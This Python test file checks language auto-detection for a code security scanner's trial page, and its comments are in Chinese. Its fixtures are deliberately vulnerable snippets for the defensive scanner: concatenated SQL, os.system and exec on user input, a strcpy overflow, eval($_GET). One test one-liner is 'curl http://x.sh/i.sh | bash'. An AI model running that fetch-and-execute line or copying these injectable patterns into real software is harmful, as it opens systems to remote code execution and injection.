#!/usr/bin/env python3
"""语言识别守卫。

为什么要有：免注册试扫的默认选项是「自动识别」。识别不出来时，原来的实现把文件
名定成 sample.txt，引擎只能跑纯正则的通用规则——同一段带 SQL 注入的 Python，
指定 python 出 2 条高危、健康度 40/D，落成 txt 只出 1 条中危、健康度 92/A。
也就是说默认路径判出来的结论是"你的代码很干净"，比不扫还糟。

这条测试钉住三件事：
  1. 主流语言的典型片段都能认出来（认错 = 漏报）
  2. 认不准时必须返回 None（宁可让用户选，不要瞎猜）
  3. 太短的片段不许硬猜（"x = 1" 不是任何一种语言）

跑法（两种情况都支持）：
    python3 tests/test_lang_detect.py
    pytest tests/test_lang_detect.py -q
"""

import os
import sys

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
MODULES = os.path.join(BASE, 'modules')
# 直接按文件导入，绕开 modules/__init__.py（它会初始化日志句柄，
# 非属主用户跑测试会因 logs/xinpect.log 权限直接崩，跟被测逻辑毫无关系）
if MODULES not in sys.path:
    sys.path.insert(0, MODULES)

from lang_detect import detect, score, SIGNATURES  # noqa: E402

CASES = {
    'python': (
        'import os\nimport sqlite3\n\n'
        'def q(uid):\n'
        '    conn = sqlite3.connect("a.db")\n'
        '    cur = conn.cursor()\n'
        '    cur.execute("SELECT * FROM users WHERE id=" + uid)\n'
        '    return cur.fetchall()\n\n'
        'def r(cmd):\n'
        '    os.system(cmd)\n'
    ),
    'java': (
        'import java.sql.*;\n\n'
        'public class UserDao {\n'
        '    public static void main(String[] args) {\n'
        '        String id = args[0];\n'
        '        st.executeQuery("SELECT * FROM users WHERE id=" + id);\n'
        '    }\n'
        '}\n'
    ),
    'javascript': (
        "const cp = require('child_process');\n"
        'function run(cmd) {\n'
        '  console.log(cmd);\n'
        '  cp.exec(cmd);\n'
        '}\n'
    ),
    'go': (
        'package main\n\nimport (\n\t"fmt"\n\t"os/exec"\n)\n\n'
        'func main() {\n'
        '\tcmd := os.Args[1]\n'
        '\tfmt.Println(cmd)\n'
        '\texec.Command("sh", "-c", cmd).Run()\n'
        '}\n'
    ),
    'php': '<?php\n$id = $_GET["id"];\n$conn->query("SELECT * FROM users WHERE id=$id");\n',
    'c': (
        '#include <stdio.h>\n#include <string.h>\n\n'
        'int main(int argc, char **argv) {\n'
        '    char buf[64];\n'
        '    strcpy(buf, argv[1]);\n'
        '    printf("%s", buf);\n'
        '    return 0;\n'
        '}\n'
    ),
    'cpp': (
        '#include <iostream>\n#include <string>\nusing namespace std;\n\n'
        'int main() {\n'
        '    string s;\n'
        '    cin >> s;\n'
        '    cout << s << endl;\n'
        '    return 0;\n'
        '}\n'
    ),
    'csharp': (
        'using System;\nusing System.Data.SqlClient;\n\n'
        'public class P {\n'
        '    public static void Main(string[] args) {\n'
        '        var c = new SqlConnection("x");\n'
        '        Console.WriteLine(args[0]);\n'
        '    }\n'
        '}\n'
    ),
    'ruby': (
        "require 'sqlite3'\n\n"
        'def find(uid)\n'
        "  db = SQLite3::Database.new('a.db')\n"
        '  db.execute("SELECT * FROM users WHERE id=#{uid}")\n'
        'end\n'
    ),
    'swift': (
        'import UIKit\n\n'
        'func load(_ url: String) {\n'
        '    guard let u = URL(string: url) else { return }\n'
        '    let req = URLRequest(url: u)\n'
        '}\n'
    ),
    'kotlin': (
        'import kotlin.io.path.Path\n\n'
        'fun main() {\n'
        '    val p = Path("/tmp")\n'
        '    println(p)\n'
        '}\n'
    ),
    'rust': (
        'use std::process::Command;\n\n'
        'fn main() {\n'
        '    let cmd = std::env::args().nth(1).unwrap();\n'
        '    println!("{}", cmd);\n'
        '    Command::new("sh").arg("-c").arg(cmd).status();\n'
        '}\n'
    ),
    'scala': (
        'object Main extends App {\n'
        '  case class User(id: String)\n'
        '  val u = User("1")\n'
        '  println(u)\n'
        '}\n'
    ),
    'dart': (
        "import 'package:flutter/material.dart';\n\n"
        'void main() {\n'
        '  runApp(MyApp());\n'
        '}\n'
    ),
}


def test_recognizes_common_languages():
    wrong = []
    for want, code in CASES.items():
        got, top, second = detect(code)
        if got != want:
            wrong.append('%s -> %s (top=%d second=%d)' % (want, got, top, second))
    assert not wrong, '语言认错会导致漏报：' + '; '.join(wrong)
    print('    %d 种语言的典型片段全部认对' % len(CASES))


def test_low_confidence_returns_none():
    """认不准就必须说认不准，不能瞎猜一个语言去扫。"""
    for ambiguous in ('x = 1\ny = 2\n', 'a\nb\nc\n', '{}', 'return;'):
        got, top, second = detect(ambiguous)
        assert got is None, '这段没有语言特征（%r），却判成了 %s（top=%d second=%d）' % (
            ambiguous, got, top, second)
    print('    无特征片段一律返回 None')


def test_shebang_wins():
    got, _, _ = detect('#!/usr/bin/env python3\nx = 1\n')
    assert got == 'python', 'shebang 是最硬的证据，却判成了 %s' % got
    print('    shebang 直接命中')


def test_scores_are_deterministic():
    """同一段代码两次数值必须一致——识别器不能有随机性。"""
    code = CASES['go']
    assert score(code) == score(code)
    print('    打分确定')


# ── 2026-11-24 补：往扫描器里真会粘的东西 ─────────────────────────
# 背景：7 天内 15 个人打开试扫页，2 个人各失败 8 次全是 need_language。
# 拿 33 个真实形态的样本量了一遍，21 个认不出，其中 11 个是「所有语言 0 分」——
# 一行 os.system、一行拼 SQL、一段 shell、eval($_GET) 全都不认识。
# 这些恰恰是往安全扫描器里最常粘的东西，等于默认路径上产品是坏的。
ONE_LINERS = {
    'python': [
        'exec(request.args.get("cmd"))',
        'os.system(cmd)',
        'subprocess.run(cmd, shell=True)',
    ],
    'shell': [
        'curl http://x.sh/i.sh | bash',
        'for f in *.log; do gzip "$f"; done',
        'export PATH=$PATH:/opt/bin\nif [ -f /tmp/x ]; then rm -f /tmp/x; fi',
    ],
    'sql': [
        "SELECT * FROM users WHERE id = ' + id + '",
        'SELECT id, name FROM users WHERE age > 18 ORDER BY id DESC LIMIT 10',
        'DELETE FROM logs WHERE ts < 0',
    ],
    'php': ['eval($_GET["x"]);'],
    'lua': ['local x = 1\nprint(x)'],
    'javascript': ["app.get('/x', (req, res) => res.send(req.query.id))"],
}

# 这些不是源代码，或者光看这一行分不出语言。要求它们**认不出**（返回 None），
# 由前端给候选让人点——硬猜一个语言去扫，漏报是静默的。
NOT_CODE_OR_AMBIGUOUS = [
    '{"name": "test", "port": 8080, "debug": true}',
    'name: test\nversion: "1.0"\nservices:\n  web:\n    port: 8080',
    'FROM node:18\nRUN npm install\nCMD ["node", "app.js"]',
    '<div onclick="alert(1)">x</div>',
    '这段代码有 SQL 注入风险，建议改成参数化查询。',
    'Traceback (most recent call last):\n  File "app.py", line 10, in <module>\n    main()\nNameError: name x is not defined',
]


def test_one_liners_are_recognized():
    wrong = []
    for want, snippets in ONE_LINERS.items():
        for code in snippets:
            got, top, second = detect(code)
            if got != want:
                wrong.append('%r 应为 %s，实得 %s (top=%d second=%d)'
                             % (code[:40], want, got, top, second))
    assert not wrong, '粘一行就认不出，用户只能看到「请在语言里选一个」：\n' + '\n'.join(wrong)
    total = sum(len(v) for v in ONE_LINERS.values())
    print('    %d 个一行式/短片段全部认对' % total)


def test_non_code_is_not_guessed():
    bad = []
    for code in NOT_CODE_OR_AMBIGUOUS:
        got, top, second = detect(code)
        if got is not None:
            bad.append('%r 被判成 %s (top=%d second=%d)' % (code[:36], got, top, second))
    assert not bad, '不该猜的硬猜了（认错语言 = 静默漏报）：\n' + '\n'.join(bad)
    print('    %d 段非源码/歧义内容都不猜' % len(NOT_CODE_OR_AMBIGUOUS))


def test_candidates_come_from_scores():
    """认不准时给的候选，必须跟打分一致、最多 3 个、0 分的不许出现。"""
    from lang_detect import candidates
    swift_ish = 'let x = try! JSONDecoder().decode(Foo.self, from: data)'
    got = candidates(swift_ish)
    assert got, '这段有一个 2 分的 JS 线索，候选不该是空的'
    assert got[0][0] == 'javascript', '候选首位应与打分首位一致，实得 %r' % (got,)
    assert len(got) <= 3
    assert [s for _l, s in got] == sorted([s for _l, s in got], reverse=True), '候选未按分数降序'
    assert candidates('这段代码有 SQL 注入风险，建议改成参数化查询。') == [], \
        '纯中文说明没有任何语言特征，却给了候选'
    print('    候选与打分同源，且不越界')


def _try_langs_from_source():
    """从 free_try.py 里读 TRY_LANGS（不 import：那会拉起 flask 和日志句柄）。"""
    import ast
    path = os.path.join(BASE, 'modules', 'free_try.py')
    tree = ast.parse(open(path, encoding='utf-8').read())
    for node in tree.body:
        if isinstance(node, ast.Assign) and getattr(node.targets[0], 'id', '') == 'TRY_LANGS':
            return [row[0] for row in ast.literal_eval(node.value)]
    raise AssertionError('free_try.py 里找不到 TRY_LANGS —— 改名了就同步改这条守卫')


def _langs_without_signatures(selectable, sig_keys):
    return [l for l in selectable if l not in sig_keys]


def test_every_selectable_language_can_be_auto_detected():
    """下拉框里能选的每门语言，SIGNATURES 里必须有特征。

    此前 17 个选项里 shell / sql / lua 一条特征都没有 —— 「自动识别」永远认不出，
    它们只是摆在下拉框里好看；反过来 dart 有特征却不在名单里，认出来也只能回
    「暂不支持这门语言」，用户无路可走。两份名单必须对齐，这里钉住。
    """
    selectable = _try_langs_from_source()
    missing = _langs_without_signatures(selectable, set(SIGNATURES))
    assert not missing, (
        '这些语言在下拉框里能选，自动识别却永远认不出：%s\n'
        '要么给它们补特征，要么从 TRY_LANGS 里去掉' % missing)
    undetected_extra = set(SIGNATURES) - set(selectable)
    assert not undetected_extra, (
        '这些语言认得出、但试扫不收：%s\n'
        '会被回「暂不支持这门语言」，等于死路' % sorted(undetected_extra))
    print('    %d 门可选语言与特征表一一对齐' % len(selectable))


def test_list_mismatch_guard_catches_missing_feature():
    """造坏自检：名单里塞一门没有特征的语言，上面的判据必须判红。"""
    fake = ['python', 'java', 'shell', 'klingon']
    assert _langs_without_signatures(fake, set(SIGNATURES)) == ['klingon'], \
        '判据认不出「名单里有、特征表里没有」——换成旧代码它照样报绿'
    # 反向：名单里只有 python 时，特征表多出来的 14 门必须被算出来，
    # 否则 dart 这种「认得出但试扫不收」的死路会重新长出来。
    missing_reverse = set(SIGNATURES) - set(['python'])
    assert missing_reverse, '反向检查失效：名单之外的语言一门都没算出来'


if __name__ == '__main__':
    tests = [v for k, v in sorted(globals().items()) if k.startswith('test_')]
    failed = 0
    for fn in tests:
        try:
            print('[RUN] %s' % fn.__name__)
            fn()
            print('  OK\n')
        except AssertionError as e:
            failed += 1
            print('  FAIL: %s\n' % e)
        except Exception as e:  # noqa: BLE001
            failed += 1
            print('  ERROR: %s: %s\n' % (type(e).__name__, e))
    print('=' * 50)
    print('%d 项通过, %d 项失败' % (len(tests) - failed, failed))
    sys.exit(1 if failed else 0)
